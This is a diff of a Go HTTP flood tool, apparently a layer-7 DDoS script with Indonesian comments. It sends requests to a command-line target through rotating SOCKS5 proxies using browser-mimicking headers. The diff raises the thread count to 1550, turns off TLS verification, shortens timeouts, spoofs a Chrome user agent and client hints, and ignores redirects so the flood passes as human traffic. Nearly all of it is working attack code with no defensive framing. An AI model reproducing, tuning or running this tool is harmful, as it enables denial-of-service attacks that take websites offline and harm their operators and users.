@@ -1,6 +1,3 @@
-// * DIZ FLYZE DEVELOPER
-// * Made In Jawa Hama
-// * Top Script Performance Rps
 package main
 
 import (
@@ -21,33 +18,32 @@ import (
 	"golang.org/x/net/proxy"
 )
 
-// Mboh lali
 const (
-	TendangJin = 350               // Seting ke 250 buat ngocok vps
-	JandaAnak  = 3 * time.Second   // Biarin
+	TendangJin = 1550
+	JandaAnak  = 2 * time.Second
 )
 
-// > Biarin ae ini
 var BeHa = http.Header{
-	"Accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"},
-	"Accept-Language":           {"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},
+	"Accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
+	"Accept-Language":           {"en-US,en;q=0.9,id;q=0.8"},
 	"Accept-Encoding":           {"gzip, deflate, br"},
+	"Connection":                {"keep-alive"},
+	"Upgrade-Insecure-Requests": {"1"},
 	"Sec-Fetch-Dest":            {"document"},
 	"Sec-Fetch-Mode":            {"navigate"},
 	"Sec-Fetch-Site":            {"none"},
 	"Sec-Fetch-User":            {"?1"},
-	"Upgrade-Insecure-Requests": {"1"},
-	"Connection":                {"keep-alive"},
+	"Cache-Control":             {"no-cache"},
+	"Pragma":                    {"no-cache"},
+	"sec-ch-ua":                 {`"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`},
 	"sec-ch-ua-mobile":          {"?0"},
 	"sec-ch-ua-platform":        {"Windows"},
 }
 
-// > Biarin ae udah maksimal ini
 func init() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 }
 
-// bacaProxyFile membaca file proxy.txt dan mengembalikan slice proxy (format "ip:port")
 func bacaProxyFile(filename string) ([]string, error) {
 	file, err := os.Open(filename)
 	if err != nil {
@@ -73,34 +69,27 @@ func bacaProxyFile(filename string) ([]string, error) {
 	return proxies, nil
 }
 
-// buatTransportSOCKS5 membuat http.Transport dengan dialer SOCKS5
 func buatTransportSOCKS5(proxyAddr string) (*http.Transport, error) {
-	// Parse proxy address (format: ip:port)
 	dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
 	if err != nil {
 		return nil, err
 	}
-	// Gunakan dialer SOCKS5 sebagai DialContext
 	return &http.Transport{
 		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
 			return dialer.Dial(network, addr)
 		},
-		DisableKeepAlives:      false,
-		MaxIdleConns:           10000,
-		MaxIdleConnsPerHost:    5000,
-		MaxConnsPerHost:        0,
-		IdleConnTimeout:        3 * time.Second,
+		DisableKeepAlives:   false,
+		MaxIdleConns:        10000,
+		MaxIdleConnsPerHost: 5000,
+		MaxConnsPerHost:     0,
+		IdleConnTimeout:     10 * time.Second,
 		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify:     false,
-			NextProtos:             []string{"h2"},
-			MinVersion:             tls.VersionTLS12,
-			MaxVersion:             tls.VersionTLS13,
-			PreferServerCipherSuites: true,
+			InsecureSkipVerify: true,
 		},
-		ForceAttemptHTTP2:      true,
-		DisableCompression:     false,
-		TLSHandshakeTimeout:    2 * time.Second,
-		ResponseHeaderTimeout:  1 * time.Second,
+		ForceAttemptHTTP2:     false,
+		DisableCompression:    true,
+		TLSHandshakeTimeout:   1 * time.Second,
+		ResponseHeaderTimeout: 500 * time.Millisecond,
 	}, nil
 }
 
@@ -116,7 +105,7 @@ func (w *Crot_Dalam) BikinAnak() *http.Request {
 		return nil
 	}
 	req.Header = BeHa.Clone()
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
 	return req
 }
 
@@ -135,8 +124,6 @@ func (w *Crot_Dalam) run(ctx context.Context, wg *sync.WaitGroup) {
 			if err == nil {
 				resp.Body.Close()
 			}
-			// Sedikit delay agar tidak terlalu banjir (opsional)
-			// time.Sleep(10 * time.Millisecond)
 		}
 	}
 }
@@ -148,7 +135,6 @@ func main() {
 	}
 	Tempek := os.Args[1]
 
-	// Baca proxy dari file proxy.txt
 	proxies, err := bacaProxyFile("proxy.txt")
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "Gagal membaca proxy.txt: %v\n", err)
@@ -156,7 +142,6 @@ func main() {
 	}
 	fmt.Printf("Membaca %d proxy dari proxy.txt\n", len(proxies))
 
-	// Banner
 	fmt.Printf("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡾⠃⠀⠀⠀⠀⠀⠀Runing : Termux\n")
 	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀Server : None\n")
 	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠻⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀Version : v1.3.0\n")
@@ -174,7 +159,7 @@ func main() {
 	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 	fmt.Printf("+ Threads : %d\n", TendangJin)
 	fmt.Printf("+ Target  : %s\n", Tempek)
-	fmt.Printf("+ Mode : Likely Human\n")
+	fmt.Printf("+ Mode    : Likely Human\n")
 	fmt.Printf("+ Ulimit  : 32768\n")
 	fmt.Printf("+ Layers  : Seven\n")
 	fmt.Printf("+ Proxies : %d (SOCKS5 rotating)\n", len(proxies))
@@ -184,17 +169,18 @@ func main() {
 	var wg sync.WaitGroup
 
 	for i := 0; i < TendangJin; i++ {
-		// Pilih proxy secara round-robin
 		proxyAddr := proxies[i%len(proxies)]
 		transport, err := buatTransportSOCKS5(proxyAddr)
 		if err != nil {
-			// Jika gagal buat transport (misal proxy invalid), skip worker ini
 			fmt.Fprintf(os.Stderr, "Worker %d: Proxy %s error: %v, skip\n", i, proxyAddr, err)
 			continue
 		}
 		client := &http.Client{
 			Transport: transport,
 			Timeout:   JandaAnak,
+			CheckRedirect: func(req *http.Request, via []*http.Request) error {
+				return http.ErrUseLastResponse
+			},
 		}
 		w := &Crot_Dalam{
 			id:     i,
